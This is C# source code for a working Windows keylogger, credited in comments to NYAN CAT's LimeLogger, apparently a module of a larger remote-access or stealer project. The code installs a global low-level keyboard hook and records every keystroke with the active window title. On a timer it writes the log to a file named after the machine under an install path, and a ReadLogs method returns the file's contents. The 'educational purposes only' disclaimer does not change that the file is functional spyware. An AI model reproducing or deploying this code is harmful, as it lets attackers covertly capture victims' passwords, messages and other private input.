using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
namespace boulzar.Methods.KG
{
    public static class Klogger
    {


        //       │ Author     : NYAN CAT
        //       │ Name       : LimeLogger v0.2.6.1
        //       │ Contact    : https://github.com/NYAN-x-CAT
        //       This program is distributed for educational purposes only.



        public static readonly string loggerPath = Csettings.install_path + @"\Windows_" + Environment.MachineName + @"\" + Environment.MachineName;
        private static string CurrentActiveWindowTitle;
        private static string KeysBuffer;
        private static System.Timers.Timer aTimer;

        public static void Start(int flushInterval)
        {
            aTimer = new System.Timers.Timer(flushInterval);

            aTimer.Elapsed += OnTimedEvent;
            aTimer.AutoReset = true;
            aTimer.Enabled = true;
            _hookID = SetHook(_proc);
            Application.Run();


            //UnhookWindowsHookEx(_hookID);
            //Application.Exit();
        }
        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            WriteOut();
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                {
                    currentKey = currentKey.ToUpper();
                }
                else
                {
                    currentKey = currentKey.ToLower();
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "<kbd>[" + (Keys)vkCode + "]</kbd>";

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = " ";
                            break;
                        case "Return":
                            currentKey = "<kbd>[ENTER]</kbd>";
                            break;
                        case "Escape":
                            currentKey = "<kbd>[ESC]</kbd>";
                            break;
                        case "LControlKey":
                            currentKey = "<kbd>[CTRL]</kbd>";
                            break;
                        case "RControlKey":
                            currentKey = "<kbd>[CTRL]</kbd>";
                            break;
                        case "RShiftKey":
                            currentKey = "<kbd>[Shift]</kbd>";
                            break;
                        case "LShiftKey":
                            currentKey = "<kbd>[Shift]</kbd>";
                            break;
                        case "Back":
                            currentKey = "<kbd>[Back]</kbd>";
                            break;
                        case "LWin":
                            currentKey = "<kbd>[WIN]</kbd>";
                            break;
                        case "Tab":
                            currentKey = "<kbd>[Tab]</kbd>";
                            break;
                        case "Capital":
                            if (capsLock == true)
                                currentKey = "<kbd>[CAPSLOCK: OFF] </kbd>";
                            else
                                currentKey = "<kbd>[CAPSLOCK: ON]</kbd>";
                            break;
                    }
                }



                if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                {
                    KeysBuffer += currentKey;

                }
                else
                {
                    KeysBuffer += "</p>" + Environment.NewLine + "<br>";
                    KeysBuffer += $"<h3>  {GetActiveWindowTitle()} </h3>" + Environment.NewLine;
                    KeysBuffer += "<p>" + currentKey;


                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        private static void WriteOut()
        {

            if (KeysBuffer != String.Empty)
            {
                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {

                    sw.Write(KeysBuffer);
                }
            }

            KeysBuffer = String.Empty;

        }
        public static string ReadLogs()
        {
            return File.Exists(loggerPath) ? Encoding.UTF8.GetString(File.ReadAllBytes(loggerPath)) : string.Empty;
        }
        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "???";
            }
        }



        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion

    }

}